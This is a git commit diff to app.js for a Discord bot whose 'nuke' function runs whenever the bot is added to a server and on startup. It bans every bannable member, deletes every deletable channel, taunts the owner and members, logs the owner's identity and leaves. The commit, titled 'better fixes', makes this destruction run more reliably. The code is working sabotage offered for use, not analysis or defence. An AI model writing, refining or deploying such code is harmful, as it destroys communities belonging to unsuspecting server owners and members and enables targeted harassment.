bbb1735bca2a08368e3084a7da8b4ef733beb2bb
appellation <nelson.will@live.com>
2017-02-11 11:40:12 -0800

    better fixes

--- app.js
+++ app.js
@@ -2,37 +2,43 @@ const { Client } = require('discord.js');
 const config = require('./config.json');
 const client = new Client();
 
-async function nuke(guild, users = 0, channels = 0) {
-  try {
-    guild.members.forEach(x => {
-      if (x.bannable) {
-        x.ban();
-        x.send('You\'re getting banned! Nothing personal...');
-        return users++;
-      }
-    });
-    guild.channels.forEach(x => {
-      if (x.deletable) {
-        x.delete();
-        return channels++;
-      }
-    });
-    await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
-    await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
-  } catch (e) {}
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
+
+  await guild.members.map(async m => {
+    if (m.bannable) {
+      users++;
+      try {
+        await m.send('You\'re getting banned! Nothing personal...')
+      } catch (e) {}
+      return m.ban();
+    }
+  });
+
+  await guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  });
+
+  const owner = await guild.fetchMember(guild.ownerID);
+  console.log(`nuked ${users} users and ${channels} channels in ${guild} owned by ${owner.user.username}#${owner.user.discriminator} (${guild.owner.id}`);
+
+  await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
+  return guild.leave();
 }
 
 client.on('ready', () => {
-  client.guilds.forEach(x => { return nuke(x); });
+  for(const [, g] of client.guilds) nuke(g).catch(console.error);
   console.log('Ready to have some fun... >:)');
 });
 
 client.on('guildCreate', async (guild) => {
-  let users = 0;
-  let channels = 0;
-
-  await nuke(guild, users, channels);
-  guild.leave();
+  return nuke(guild).catch(console.error);
 });
 
 client.login(config.token).catch(console.error);
